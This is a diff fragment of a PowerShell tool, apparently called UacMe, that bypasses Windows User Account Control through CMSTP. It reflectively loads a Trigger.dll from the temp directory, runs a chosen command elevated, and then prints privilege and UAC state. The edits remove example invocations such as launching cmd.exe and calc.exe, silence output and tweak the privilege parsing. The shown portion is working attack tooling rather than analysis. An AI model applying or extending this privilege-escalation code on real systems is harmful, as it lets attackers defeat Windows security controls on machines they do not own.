@@ -276,10 +276,9 @@ ShortSvcName=`"`"CorpVPN`"`"
          exit ## Exit @UacMe
       }
 
-      ## Execution example: [CMSTPvuln]::Execute("powershell.exe")
-      # Execution example: [CMSTPvuln]::Execute("C:\Windows\System32\cmd.exe /c start calc.exe")
+      ## Load Trigger.dll into memory
       [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$Env:TMP\Trigger.dll"))|Out-Null
-      cd $Env:TMP;[CMSTPvuln]::Execute("$Execute")
+      cd $Env:TMP;[CMSTPvuln]::Execute("$Execute")|Out-Null
       cd $Working_Directory ## Return to UacMe working directory!
       
    }Else{## [error] $Env:TMP\Source.cs not found\created!
@@ -293,11 +292,10 @@ ShortSvcName=`"`"CorpVPN`"`"
    Write-Host "`n"
    ## Get Shell privileges
    $ShellPriv = whoami /priv
-   $ParseData = $ShellPriv -replace 'PRIVILEGES INFORMATION  ----------------------',''
+   $ParseData = $ShellPriv -replace 'PRIVILEGES INFORMATION','' -replace '----------------------',''
    echo $ParseData > $Env:TMP\graca.log;Get-Content -Path "$Env:TMP\graca.log" | Where-Object { $_ -ne "" }
 
    ## Build Output Table
-   Start-Sleep -Seconds 1
    Write-Host "`nUAC State     : $UacStatus"
    Write-Host "UAC Settings  : $UacSettings"
    Write-Host "ReflectionDll : $Env:TMP\Trigger.dll"
